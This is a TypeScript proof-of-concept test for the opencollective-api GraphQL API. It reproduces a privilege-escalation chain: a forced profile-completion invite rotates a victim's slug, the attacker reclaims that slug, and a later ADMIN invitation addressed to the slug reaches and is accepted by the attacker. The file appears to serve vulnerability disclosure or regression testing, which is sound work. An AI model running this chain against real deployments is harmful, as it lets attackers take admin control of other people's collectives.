/**
 * PoC: inviteMember isNewUser → profile completion slug rotation → slug reclaim → misdirected ADMIN invite
 *
 * Copy to:
 *   opencollective-api/test/server/graphql/v2/mutation/invite-member-slug-admin-redirect.poc.test.ts
 * Run from workspace root:
 *   ./scripts/test.sh opencollective-api/test/server/graphql/v2/mutation/invite-member-slug-admin-redirect.poc.test.ts
 */

import { expect } from 'chai';
import gql from 'fake-tag';

import roles from '../../../../../server/constants/roles';
import { idEncode, IDENTIFIER_TYPES } from '../../../../../server/graphql/v2/identifiers';
import models from '../../../../../server/models';
import { fakeCollective, fakeUser } from '../../../../test-helpers/fake-data';
import * as utils from '../../../../utils';

const VICTIM_SLUG = 'poc-victim-trusted-handle';

const inviteMemberMutation = gql`
  mutation InviteMember(
    $memberAccount: AccountReferenceInput!
    $account: AccountReferenceInput!
    $role: MemberRole!
    $isNewUser: Boolean
  ) {
    inviteMember(memberAccount: $memberAccount, account: $account, role: $role, isNewUser: $isNewUser) {
      id
      role
    }
  }
`;

const editAccountMutation = gql`
  mutation EditAccount($account: AccountUpdateInput!) {
    editAccount(account: $account) {
      id
      slug
      name
    }
  }
`;

const replyToMemberInvitationMutation = gql`
  mutation ReplyToMemberInvitation($invitation: MemberInvitationReferenceInput!, $accept: Boolean!) {
    replyToMemberInvitation(invitation: $invitation, accept: $accept)
  }
`;

describe('PoC: inviteMember slug redirect admin escalation', () => {
  before(async () => {
    await utils.resetTestDB();
  });

  it('attacker becomes ADMIN of unrelated collective via reclaimed victim slug', async () => {
    const victim = await fakeUser({ name: 'Trusted Contributor' }, { slug: VICTIM_SLUG, name: 'Trusted Contributor' });
    const attacker = await fakeUser();
    const attackerCollectiveAdmin = await fakeUser();
    const attackerOwnedCollective = await fakeCollective({ admin: attackerCollectiveAdmin });

    const victimSlugBefore = victim.collective.slug;
    expect(victimSlugBefore).to.equal(VICTIM_SLUG);

    const griefInvite = await utils.graphqlQueryV2(
      inviteMemberMutation,
      {
        memberAccount: { id: idEncode(victim.collective.id, IDENTIFIER_TYPES.ACCOUNT) },
        account: { id: idEncode(attackerOwnedCollective.id, IDENTIFIER_TYPES.ACCOUNT) },
        role: roles.MEMBER,
        isNewUser: true,
      },
      attackerCollectiveAdmin,
    );
    expect(griefInvite.errors).to.not.exist;

    await victim.collective.reload();
    expect(victim.collective.data?.requiresProfileCompletion).to.equal(true);

    const profileResult = await utils.graphqlQueryV2(
      editAccountMutation,
      {
        account: {
          id: idEncode(victim.collective.id, IDENTIFIER_TYPES.ACCOUNT),
          name: 'Trusted Contributor Updated',
        },
      },
      victim,
    );
    expect(profileResult.errors).to.not.exist;
    expect(profileResult.data.editAccount.slug).to.not.equal(victimSlugBefore);

    const freedSlugOwner = await models.Collective.findOne({ where: { slug: victimSlugBefore } });
    expect(freedSlugOwner).to.be.null;

    const reclaimResult = await utils.graphqlQueryV2(
      editAccountMutation,
      {
        account: {
          id: idEncode(attacker.collective.id, IDENTIFIER_TYPES.ACCOUNT),
          slug: victimSlugBefore,
        },
      },
      attacker,
    );
    expect(reclaimResult.errors).to.not.exist;
    expect(reclaimResult.data.editAccount.slug).to.equal(victimSlugBefore);

    const targetAdmin = await fakeUser();
    const targetCollective = await fakeCollective({ admin: targetAdmin, name: 'Unrelated Target Collective' });

    const adminInvite = await utils.graphqlQueryV2(
      inviteMemberMutation,
      {
        memberAccount: { slug: victimSlugBefore },
        account: { id: idEncode(targetCollective.id, IDENTIFIER_TYPES.ACCOUNT) },
        role: roles.ADMIN,
        isNewUser: false,
      },
      targetAdmin,
    );
    expect(adminInvite.errors).to.not.exist;

    const invitation = await models.MemberInvitation.findOne({
      where: { CollectiveId: targetCollective.id, role: roles.ADMIN },
    });
    expect(invitation).to.exist;
    expect(invitation.MemberCollectiveId).to.equal(attacker.CollectiveId);

    const acceptResult = await utils.graphqlQueryV2(
      replyToMemberInvitationMutation,
      {
        invitation: { id: idEncode(invitation.id, IDENTIFIER_TYPES.MEMBER_INVITATION) },
        accept: true,
      },
      attacker,
    );
    expect(acceptResult.errors).to.not.exist;
    expect(acceptResult.data.replyToMemberInvitation).to.equal(true);

    const attackerMembership = await models.Member.findOne({
      where: {
        CollectiveId: targetCollective.id,
        MemberCollectiveId: attacker.CollectiveId,
        role: roles.ADMIN,
      },
    });
    expect(attackerMembership).to.exist;
  });
});
